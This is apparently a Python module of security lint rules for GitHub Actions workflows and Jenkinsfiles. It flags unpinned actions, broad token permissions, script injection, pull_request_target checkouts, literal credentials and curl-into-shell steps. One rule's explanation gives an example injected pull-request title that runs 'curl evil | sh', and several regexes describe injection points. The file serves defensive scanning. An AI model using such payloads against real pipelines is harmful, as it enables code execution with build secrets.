"""Rules for GitHub Actions workflows (GA) and Jenkins declarative pipelines (JK).

They live beside the Harness rules and share the same findings, suppressions, severities
and report formats. A file is routed by its kind: an Actions workflow has `jobs` and `on`,
a Jenkinsfile is recognised by its name, everything else is treated as a Harness file.
"""

from __future__ import annotations

import re
from collections.abc import Iterator

from .model import Doc, Node
from .rules import ERROR, INFO, PIPE_TO_SHELL, SECRET_VALUE, WARNING, rule

GITHUB, JENKINS = "github", "jenkins"


def _find_line(doc: Doc, start: int, pattern: str, span: int = 60) -> int:
    rx = re.compile(pattern)
    for n in range(max(start, 1), min(len(doc.lines), start + span) + 1):
        if rx.search(doc.lines[n - 1]):
            return n
    return start


def _jobs(doc: Doc) -> Iterator[tuple[str, Node]]:
    jobs = doc.root.get("jobs")
    if isinstance(jobs, dict):
        for job_id, job in jobs.items():
            if isinstance(job, Node):
                yield str(job_id), job


def _steps(job: Node) -> Iterator[Node]:
    steps = job.get("steps")
    if isinstance(steps, list):
        for step in steps:
            if isinstance(step, Node):
                yield step


def _triggers(doc: Doc) -> set[str]:
    on = doc.root.get("on", doc.root.get(True))
    if isinstance(on, str):
        return {on}
    if isinstance(on, list):
        return {str(item) for item in on}
    if isinstance(on, dict):
        return {str(key) for key in on}
    return set()


def _scripts(job: Node) -> Iterator[tuple[Node, str]]:
    """Every shell script or github-script body in a job, with the step that owns it."""
    for step in _steps(job):
        run = step.get("run")
        if isinstance(run, str):
            yield step, run
        with_ = step.get("with")
        if isinstance(with_, dict) and isinstance(with_.get("script"), str):
            yield step, with_["script"]


# --- GA001 -----------------------------------------------------------------

FULL_SHA = re.compile(r"^[0-9a-f]{40}$")
FIRST_PARTY = ("actions/", "github/")


def _uses(doc: Doc) -> Iterator[tuple[int, str]]:
    for _, job in _jobs(doc):
        if isinstance(job.get("uses"), str):
            yield _find_line(doc, job.line, r"\buses:"), job["uses"]
        for step in _steps(job):
            if isinstance(step.get("uses"), str):
                yield _find_line(doc, step.line, r"\buses:"), step["uses"]


@rule(
    "GA001",
    WARNING,
    "Third-party action not pinned to a commit",
    "A tag such as @v4 can be moved by whoever controls the action's repository. Pinning to a "
    "full 40-character commit SHA means the code you reviewed is the code that runs with your "
    "workflow's token and secrets.",
    kind=GITHUB,
)
def unpinned_action(doc: Doc):
    for line, value in _uses(doc):
        if value.startswith(("./", "docker://")) or value.startswith(FIRST_PARTY) or "@" not in value:
            continue
        ref = value.rsplit("@", 1)[1]
        if not FULL_SHA.match(ref):
            yield line, f"'{value}' is pinned to '{ref}', not a commit SHA", "pin to the full commit SHA and keep the tag in a comment"


# --- GA002 / GA005 ---------------------------------------------------------


@rule(
    "GA002",
    WARNING,
    "Workflow does not restrict the GITHUB_TOKEN",
    "Without a permissions block the token gets the repository's default scope, which is often "
    "read and write on everything. A compromised step then has far more reach than it needs.",
    kind=GITHUB,
)
def missing_permissions(doc: Doc):
    if "permissions" in doc.root:
        return
    jobs = list(_jobs(doc))
    open_jobs = [job_id for job_id, job in jobs if "permissions" not in job]
    if open_jobs:
        yield (
            _find_line(doc, 1, r"^jobs:"),
            f"no permissions set at the top or on job(s): {', '.join(open_jobs)}",
            "add `permissions: contents: read` at the top and grant more per job only where needed",
        )


@rule(
    "GA005",
    ERROR,
    "permissions: write-all",
    "write-all gives the token every scope. Any third-party action or injected command in the "
    "job can push code, change releases and edit packages.",
    kind=GITHUB,
)
def write_all(doc: Doc):
    if doc.root.get("permissions") == "write-all":
        yield _find_line(doc, 1, r"^permissions:"), "workflow grants write-all permissions", "list only the scopes the jobs need"
    for job_id, job in _jobs(doc):
        if job.get("permissions") == "write-all":
            yield _find_line(doc, job.line, r"permissions:"), f"job '{job_id}' grants write-all permissions", "list only the scopes this job needs"


# --- GA003 / GA006 / GA009 -------------------------------------------------

UNTRUSTED_CONTEXT = re.compile(
    r"\$\{\{\s*(github\.head_ref"
    r"|github\.event\.(issue\.(title|body)"
    r"|pull_request\.(title|body|head\.(ref|label|repo\.default_branch))"
    r"|(comment|review|review_comment|discussion)\.(body|title)"
    r"|head_commit\.(message|author\.(email|name))"
    r"|commits\[[^\]]*\]\.(message|author\.(email|name))"
    r"|pages\[[^\]]*\]\.page_name"
    r"|workflow_run\.(head_branch|display_title|head_commit\.(message|author\.(email|name)))))"
    r"\s*\}\}"
)


@rule(
    "GA003",
    ERROR,
    "Untrusted event data interpolated into a script",
    "GitHub substitutes ${{ ... }} into the script text before the shell parses it. A pull "
    "request titled `a\"; curl evil | sh; \"` becomes part of the command. Pass the value through "
    "an environment variable and read it quoted.",
    kind=GITHUB,
)
def script_injection(doc: Doc):
    for _, job in _jobs(doc):
        for step, script in _scripts(job):
            match = UNTRUSTED_CONTEXT.search(script)
            if match:
                expression = re.sub(r"\s+", " ", match.group(0))
                yield (
                    _find_line(doc, step.line, r"\b(run|script):"),
                    f"{expression} is interpolated into a script",
                    "set it under `env:` and use \"$VAR\" in the script",
                )


@rule(
    "GA006",
    WARNING,
    "Secret interpolated into a script",
    "A secret written into the script text can leak through shell tracing or an error message, "
    "and it is expanded before the shell can quote it. An environment variable keeps it out of "
    "the command line.",
    kind=GITHUB,
)
def secret_in_script(doc: Doc):
    for _, job in _jobs(doc):
        for step, script in _scripts(job):
            if re.search(r"\$\{\{\s*secrets\.", script):
                yield _find_line(doc, step.line, r"\b(run|script):"), "a secret is interpolated into a script", "pass it with `env:` and read \"$NAME\""


@rule(
    "GA009",
    WARNING,
    "Pipes a download straight into a shell",
    "curl | sh runs whatever the server returns today, with the workflow's token and secrets. "
    "Download, verify a checksum, then run.",
    kind=GITHUB,
)
def gha_pipe_to_shell(doc: Doc):
    for _, job in _jobs(doc):
        for step, script in _scripts(job):
            if PIPE_TO_SHELL.search(script):
                yield _find_line(doc, step.line, r"\brun:"), "a step pipes a download into a shell", "download to a file, check its sha256, then execute"


# --- GA004 / GA007 / GA008 -------------------------------------------------

PR_HEAD_REF = re.compile(r"pull_request\.head|head_ref|github\.event\.pull_request")


@rule(
    "GA004",
    ERROR,
    "pull_request_target checks out the pull request's code",
    "pull_request_target runs with write access and secrets, on the base repository's behalf. "
    "Checking out the PR head and running it lets anyone who opens a PR execute their code with "
    "those privileges.",
    kind=GITHUB,
)
def pwn_request(doc: Doc):
    if "pull_request_target" not in _triggers(doc):
        return
    for job_id, job in _jobs(doc):
        for step in _steps(job):
            uses = step.get("uses")
            with_ = step.get("with")
            if isinstance(uses, str) and uses.startswith("actions/checkout") and isinstance(with_, dict):
                ref = str(with_.get("ref", ""))
                if PR_HEAD_REF.search(ref):
                    yield (
                        _find_line(doc, step.line, r"\bref:"),
                        f"job '{job_id}' checks out the PR head under pull_request_target",
                        "use pull_request, or run untrusted code in a separate workflow with no secrets",
                    )


@rule(
    "GA007",
    WARNING,
    "Self-hosted runner on a pull request workflow",
    "A self-hosted runner keeps its filesystem and network between jobs. If anyone can open a pull "
    "request, they can run code on that machine and reach what it can reach.",
    kind=GITHUB,
)
def self_hosted_on_pr(doc: Doc):
    if not _triggers(doc) & {"pull_request", "pull_request_target"}:
        return
    for job_id, job in _jobs(doc):
        if "self-hosted" in str(job.get("runs-on", "")):
            yield _find_line(doc, job.line, r"runs-on:"), f"job '{job_id}' uses a self-hosted runner on a PR trigger", "use ephemeral hosted runners for PRs, or require approval for outside contributors"


@rule(
    "GA008",
    INFO,
    "Job without a timeout",
    "The default job timeout is six hours. A hung job holds a runner and burns minutes for that long.",
    kind=GITHUB,
)
def no_job_timeout(doc: Doc):
    for job_id, job in _jobs(doc):
        if "uses" not in job and "timeout-minutes" not in job:
            yield job.line, f"job '{job_id}' has no timeout-minutes", "add timeout-minutes with a limit near the job's normal duration"


# --- Jenkins ---------------------------------------------------------------

COMMENT = re.compile(r"(?<!:)//.*$")


def _code(doc: Doc) -> list[tuple[int, str]]:
    """Source lines with // comments removed, numbered from 1."""
    return [(n, COMMENT.sub("", text)) for n, text in enumerate(doc.lines, 1)]


def _text_and_starts(doc: Doc) -> tuple[str, list[int]]:
    lines = [text for _, text in _code(doc)]
    starts, pos = [], 0
    for text in lines:
        starts.append(pos)
        pos += len(text) + 1
    return "\n".join(lines), starts


def _line_of(starts: list[int], index: int) -> int:
    lo, hi = 0, len(starts) - 1
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if starts[mid] <= index:
            lo = mid
        else:
            hi = mid - 1
    return lo + 1


CREDENTIAL_ASSIGNMENT = re.compile(
    r"""(?ix)\b\w*(pass(word)?|passwd|token|secret|api[_-]?key|access[_-]?key)\w*\s*[:=]\s*
        (?P<q>['"])(?!\s*\$\{)(?P<value>[^'"\n]{6,})(?P=q)"""
)


@rule(
    "JK001",
    ERROR,
    "Literal credential in a Jenkinsfile",
    "A password or token written into the Jenkinsfile is readable by everyone with repository "
    "access and stays in git history. Use the Jenkins credentials store and withCredentials or "
    "credentials().",
    kind=JENKINS,
)
def jenkins_credential(doc: Doc):
    for n, text in _code(doc):
        if CREDENTIAL_ASSIGNMENT.search(text) or SECRET_VALUE.search(text):
            yield n, "a credential-shaped literal is set in the Jenkinsfile", "use credentials('id') or withCredentials([...])"


@rule(
    "JK002",
    WARNING,
    "agent any",
    "`agent any` runs the build on whichever executor is free, including ones with credentials or "
    "tools the job should not see. Name a label or run in a container.",
    kind=JENKINS,
)
def agent_any(doc: Doc):
    for n, text in _code(doc):
        if re.match(r"^\s*agent\s+any\b", text):
            yield n, "the pipeline runs on any agent", "use agent { label '...' } or agent { docker { image '...' } }"


@rule(
    "JK003",
    WARNING,
    "Pipeline without a timeout",
    "Without a timeout a hung build holds an executor until someone notices. Set one in options.",
    kind=JENKINS,
)
def pipeline_timeout(doc: Doc):
    code = _code(doc)
    start = next((n for n, text in code if re.match(r"^\s*pipeline\s*\{", text)), None)
    if start and not any(re.search(r"\btimeout\s*\(", text) for _, text in code):
        yield start, "the pipeline sets no timeout", "add options { timeout(time: 30, unit: 'MINUTES') }"


UNTRUSTED_GROOVY = re.compile(
    r"\$\{?\s*(params\.\w+|env\.(CHANGE_\w+|BRANCH_NAME|GIT_BRANCH|TAG_NAME)|BRANCH_NAME|CHANGE_TITLE|CHANGE_BRANCH)"
)
SH_DOUBLE = re.compile(r'\bsh\s*\(?\s*(?:script\s*:\s*)?("""|")')


@rule(
    "JK004",
    WARNING,
    "Untrusted value interpolated into a double-quoted sh step",
    "Groovy expands ${...} in a double-quoted string before the shell sees it, so a branch or "
    "parameter value becomes part of the command. Use single quotes and read an environment "
    "variable inside the shell.",
    kind=JENKINS,
)
def groovy_injection(doc: Doc):
    text, starts = _text_and_starts(doc)
    for m in SH_DOUBLE.finditer(text):
        delimiter = m.group(1)
        end = text.find(delimiter, m.end())
        if delimiter == '"':
            newline = text.find("\n", m.end())
            end = end if end != -1 and (newline == -1 or end < newline) else -1
        if end == -1:
            continue
        if UNTRUSTED_GROOVY.search(text[m.end():end]):
            yield _line_of(starts, m.start()), "a double-quoted sh step interpolates a parameter or branch value", "use sh '...' and reference \"$VAR\" from environment { }"


IMAGE = re.compile(r"""\bimage\s*\(?\s*['"]([^'"\s]+)['"]""")


@rule(
    "JK005",
    WARNING,
    "Unpinned container image",
    "An image with no tag, or :latest, changes under you. The same Jenkinsfile can behave differently "
    "next week. Pin a version tag or an @sha256 digest.",
    kind=JENKINS,
)
def jenkins_image(doc: Doc):
    for n, text in _code(doc):
        for m in IMAGE.finditer(text):
            ref = m.group(1)
            if "$" in ref or "@sha256:" in ref:
                continue
            last = ref.rsplit("/", 1)[-1]
            if ":" not in last or last.endswith(":latest"):
                yield n, f"image '{ref}' is not pinned", "pin a version tag or an @sha256 digest"


STAGE = re.compile(r"""\bstage\s*\(\s*['"]([^'"]+)['"]\s*\)\s*\{""")
PROD_DEPLOY = re.compile(r"(?i)(prod)")
DEPLOY_WORD = re.compile(r"(?i)(deploy|release|promote|rollout)")
INPUT_STEP = re.compile(r"\binput\s*(\(|\{|message\b|['\"])")


def _block(text: str, open_index: int) -> str:
    depth, i = 0, open_index
    while i < len(text):
        if text[i] == "{":
            depth += 1
        elif text[i] == "}":
            depth -= 1
            if depth == 0:
                return text[open_index : i + 1]
        i += 1
    return text[open_index:]


@rule(
    "JK006",
    ERROR,
    "Production deploy with no approval step",
    "A pipeline that deploys to production without a human approval (an `input` step) ships every "
    "merge. Put an approval before the production stage.",
    kind=JENKINS,
)
def prod_without_input(doc: Doc):
    text, starts = _text_and_starts(doc)
    approved = False
    for m in STAGE.finditer(text):
        body = _block(text, m.end() - 1)
        name = m.group(1)
        if INPUT_STEP.search(body):
            approved = True
        if PROD_DEPLOY.search(name) and DEPLOY_WORD.search(name) and not approved:
            yield _line_of(starts, m.start()), f"stage '{name}' deploys to production with no input approval before it", "add an input step in or before this stage"


@rule(
    "JK007",
    WARNING,
    "Pipes a download straight into a shell",
    "curl | sh runs whatever the server returns today, with the build's credentials. Download, "
    "verify a checksum, then run.",
    kind=JENKINS,
)
def jenkins_pipe_to_shell(doc: Doc):
    for n, text in _code(doc):
        if PIPE_TO_SHELL.search(text):
            yield n, "a step pipes a download into a shell", "download to a file, check its sha256, then execute"
